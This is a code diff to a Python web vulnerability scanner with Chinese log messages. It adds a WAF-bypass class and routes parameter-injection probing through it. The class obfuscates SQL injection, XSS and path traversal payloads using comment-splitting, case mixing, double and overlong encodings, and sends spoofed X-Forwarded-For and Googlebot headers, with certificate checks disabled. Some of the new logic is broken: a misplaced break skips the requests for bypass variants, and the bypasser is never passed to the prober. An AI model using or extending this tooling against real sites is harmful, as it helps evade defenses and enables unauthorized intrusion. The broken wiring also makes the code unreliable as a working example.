@@ -267,12 +267,14 @@ class AttackProber:
     ]
 
     def __init__(self, config: ScanConfig, session: requests.Session,
-                 rate_limiter, logger: logging.Logger, analyzer: ResponseAnalyzer):
+                 rate_limiter, logger: logging.Logger, analyzer: ResponseAnalyzer,
+                 waf_bypasser: WAFBypasser = None):
         self.config = config
         self.session = session
         self.rate_limiter = rate_limiter
         self.logger = logger
         self.analyzer = analyzer
+        self.waf_bypasser = waf_bypasser
         self.probe_results: List[Dict] = []
 
     def probe_paths(self) -> List[Dict]:
@@ -327,7 +329,7 @@ class AttackProber:
         return found
 
     def probe_params(self, discovered_params: Set[str] = None) -> List[Dict]:
-        self.logger.info("攻击探测 [2/3] 参数注入探测...")
+        self.logger.info("攻击探测 [2/3] 参数注入探测 (WAF 绕过)...")
 
         params_to_test = set(discovered_params or [])
         common_params = {"id", "page", "q", "search", "query", "keyword", "name",
@@ -355,44 +357,67 @@ class AttackProber:
                         if not self.rate_limiter.acquire(timeout=30):
                             continue
 
-                        parsed = urlparse(test_url)
-                        qs = parse_qs(parsed.query)
-                        qs[param] = [payload]
-                        new_query = urlencode({k: v[0] if isinstance(v, list) else v
-                                             for k, v in qs.items()})
-                        inject_url = urlunparse(parsed._replace(query=new_query))
+                        bypass_variants = []
+                        if self.waf_bypasser:
+                            bypass_variants = self.waf_bypasser.generate_bypass_variants(payload, vuln_type)
+                        else:
+                            bypass_variants = [{"payload": payload, "technique": "original", "type": vuln_type}]
 
-                        try:
-                            resp = self.session.get(inject_url,
-                                                   timeout=self.config.request_timeout,
-                                                   allow_redirects=True,
-                                                   verify=False)
-                        except Exception:
-                            continue
+                        for variant in bypass_variants[:5]:
+                            test_payload = variant["payload"]
+                            technique = variant["technique"]
 
-                        if resp is None:
-                            continue
+                            parsed = urlparse(test_url)
+                            qs = parse_qs(parsed.query)
+                            qs[param] = [test_payload]
+                            new_query = urlencode({k: v[0] if isinstance(v, list) else v
+                                                 for k, v in qs.items()})
+                            inject_url = urlunparse(parsed._replace(query=new_query))
 
-                        analysis = self.analyzer.analyze(resp, source=f"inject:{param}")
+                            try:
+                                headers = {}
+                                if self.waf_bypasser and technique != "original":
+                                    for header_mod in self.waf_bypasser.HEADER_BYPASS[:3]:
+                                        headers.update(header_mod)
+                                    break
 
-                        is_vuln, confidence, reason = self._quick_verify(
-                            resp, payload, vuln_type, param)
+                                resp = self.session.get(inject_url,
+                                                       timeout=self.config.request_timeout,
+                                                       allow_redirects=True,
+                                                       verify=False,
+                                                       headers=headers if headers else None)
+                            except Exception:
+                                continue
 
-                        if is_vuln:
-                            result = {
-                                "url": inject_url,
-                                "param": param,
-                                "payload": payload[:80],
-                                "vuln_type": vuln_type,
-                                "status_code": resp.status_code,
-                                "confidence": confidence,
-                                "reason": reason,
-                                "vuln": True,
-                                "severity": "high" if vuln_type in ("sql_injection", "command_injection") else "medium",
-                            }
-                            found.append(result)
-                            self.probe_results.append(result)
-                            self.logger.info(f"  注入发现：[{vuln_type}] {param}={payload[:30]} → {reason}")
+                            if resp is None:
+                                continue
+
+                            analysis = self.analyzer.analyze(resp, source=f"inject:{param}")
+
+                            is_vuln, confidence, reason = self._quick_verify(
+                                resp, test_payload, vuln_type, param)
+
+                            if is_vuln:
+                                result = {
+                                    "url": inject_url,
+                                    "param": param,
+                                    "payload": test_payload[:80],
+                                    "vuln_type": vuln_type,
+                                    "status_code": resp.status_code,
+                                    "confidence": confidence,
+                                    "reason": reason,
+                                    "waf_technique": technique,
+                                    "vuln": True,
+                                    "severity": "high" if vuln_type in ("sql_injection", "command_injection") else "medium",
+                                }
+                                found.append(result)
+                                self.probe_results.append(result)
+
+                                if self.waf_bypasser and technique != "original":
+                                    self.waf_bypasser.record_success(technique)
+
+                                self.logger.info(f"  注入发现：[{vuln_type}] {param}={test_payload[:30]} → {reason} (WAF: {technique})")
+                                break
 
         self.logger.info(f"参数探测完成：{total_probes} 次 | 发现 {len(found)} 个漏洞")
         return found
@@ -975,6 +1000,7 @@ class ScanOrchestrator:
         self.prefilter = POCPrefilter(self.logger, self.modules)
         self.analyzer = ResponseAnalyzer(config.target_url, self.logger)
         self.prober = AttackProber(config, self.session, self.rate_limiter, self.logger, self.analyzer)
+        self.waf_bypasser = WAFBypasser(config, self.logger)
 
         self.results: List[Dict] = []
         self._stop_event = Event()
@@ -1168,6 +1194,158 @@ class MemoryGuard:
             pass
         except Exception:
             pass
+
+
+class WAFBypasser:
+    ENCODING_TECHNIQUES = {
+        "url_double": lambda x: "".join(f"%{ord(c):02X}" for c in x),
+        "url_unicode": lambda x: "".join(f"%u{ord(c):04X}" if c.isalpha() else c for c in x),
+        "url_extra": lambda x: "".join(f"%{ord(c):02X}%{ord(c):02X}" for c in x),
+        "hex": lambda x: "".join(f"\\x{ord(c):02x}" for c in x),
+        "unicode": lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
+        "base64": lambda x: __import__("base64").b64encode(x.encode()).decode(),
+    }
+
+    SQL_OBFUSCATION = [
+        lambda x: x.replace(" ", "/**/"),
+        lambda x: x.replace(" ", "%09"),
+        lambda x: x.replace(" ", "%0A"),
+        lambda x: x.replace("AND", "AnD").replace("OR", "Or").replace("SELECT", "SeLeCt"),
+        lambda x: x.replace("=", "%3D").replace("<", "%3C").replace(">", "%3E"),
+        lambda x: x.replace("'", "%27").replace('"', '%22'),
+        lambda x: x.replace("UNION", "UNI/**/ON").replace("SELECT", "SEL/**/ECT"),
+        lambda x: x + " AND '1'='1",
+        lambda x: x.replace("(", "%28").replace(")", "%29"),
+    ]
+
+    XSS_OBFUSCATION = [
+        lambda x: x.replace("<", "%3C").replace(">", "%3E"),
+        lambda x: x.replace("script", "scr%69pt"),
+        lambda x: x.replace("alert", "ale%72t"),
+        lambda x: x.replace(" ", "%09").replace("(", "%28").replace(")", "%29"),
+        lambda x: x.replace("<script>", "<scr<script>ipt>"),
+        lambda x: x.replace("'", "%27").replace('"', "%22"),
+        lambda x: x.replace("javascript:", "java&#115;cript:"),
+        lambda x: x.replace("onerror", "one%72ror"),
+        lambda x: x.replace("onload", "onl%6Fad"),
+    ]
+
+    PATH_TRAVERSAL_OBFUSCATION = [
+        lambda x: x.replace("../", "..%2f").replace("..\\", "..%5c"),
+        lambda x: x.replace("..", "....//").replace("..", "....\\"),
+        lambda x: x.replace("/", "%252f").replace("\\", "%255c"),
+        lambda x: x.replace("../", "..%c0%af"),
+        lambda x: x.replace("../", "..%255c"),
+        lambda x: x.replace("../", "%2e%2e%2f"),
+        lambda x: x.replace("../", "%2e%2e/"),
+        lambda x: x.replace("../", "..%ef%bc%8f"),
+    ]
+
+    HEADER_BYPASS = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Remote-IP": "127.0.0.1"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1"},
+        {"X-Forwarded-Host": "localhost"},
+        {"X-Host": "localhost"},
+        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
+        {"User-Agent": "curl/7.64.1"},
+        {"Accept-Language": "en-US,en;q=0.9"},
+        {"Accept-Encoding": "gzip, deflate, br"},
+    ]
+
+    CHUNKED_ENCODING = True
+
+    def __init__(self, config, logger):
+        self.config = config
+        self.logger = logger
+        self.bypass_attempts = 0
+        self.successful_techniques = []
+
+    def bypass_request(self, method, url, headers=None, body="", payload_type="sql_injection"):
+        self.bypass_attempts += 1
+        results = []
+
+        if payload_type == "sql_injection":
+            obfuscation_funcs = self.SQL_OBFUSCATION
+        elif payload_type == "xss":
+            obfuscation_funcs = self.XSS_OBFUSCATION
+        elif payload_type == "path_traversal":
+            obfuscation_funcs = self.PATH_TRAVERSAL_OBFUSCATION
+        else:
+            obfuscation_funcs = []
+
+        for obfuscate_func in obfuscation_funcs[:5]:
+            try:
+                modified_body = obfuscate_func(body) if body else body
+                modified_url = url
+
+                for enc_name, enc_func in list(self.ENCODING_TECHNIQUES.items())[:3]:
+                    try:
+                        encoded_payload = enc_func(modified_body[:50]) if modified_body else ""
+                    except:
+                        encoded_payload = modified_body
+
+                    try:
+                        test_headers = dict(headers) if headers else {}
+                        for header_mod in self.HEADER_BYPASS[:5]:
+                            test_headers.update(header_mod)
+
+                            result = {
+                                "url": modified_url,
+                                "method": method,
+                                "headers": test_headers,
+                                "body": modified_body,
+                                "technique": f"{obfuscation_funcs.index(obfuscate_func)}_{enc_name}",
+                            }
+                            results.append(result)
+
+                            if len(results) >= 10:
+                                return results
+                    except Exception:
+                        continue
+            except Exception:
+                continue
+
+        return results if results else [{"url": url, "method": method, "headers": headers, "body": body, "technique": "original"}]
+
+    def generate_bypass_variants(self, payload, payload_type="sql_injection"):
+        variants = []
+
+        if payload_type == "sql_injection":
+            obfuscation_funcs = self.SQL_OBFUSCATION
+        elif payload_type == "xss":
+            obfuscation_funcs = self.XSS_OBFUSCATION
+        elif payload_type == "path_traversal":
+            obfuscation_funcs = self.PATH_TRAVERSAL_OBFUSCATION
+        else:
+            obfuscation_funcs = []
+
+        for i, obfuscate_func in enumerate(obfuscation_funcs[:8]):
+            try:
+                modified = obfuscate_func(payload)
+                variants.append({"payload": modified, "technique": f"obfuscate_{i}", "type": payload_type})
+            except:
+                pass
+
+        for enc_name, enc_func in list(self.ENCODING_TECHNIQUES.items())[:4]:
+            try:
+                encoded = enc_func(payload)
+                variants.append({"payload": encoded, "technique": f"encoding_{enc_name}", "type": payload_type})
+            except:
+                pass
+
+        return variants if variants else [{"payload": payload, "technique": "original", "type": payload_type}]
+
+    def record_success(self, technique):
+        if technique not in self.successful_techniques:
+            self.successful_techniques.append(technique)
+            self.logger.info(f"WAF 绕过成功：{technique}")
+
+    def get_preferred_techniques(self):
+        return self.successful_techniques if self.successful_techniques else ["original"]
 
 
 def main():
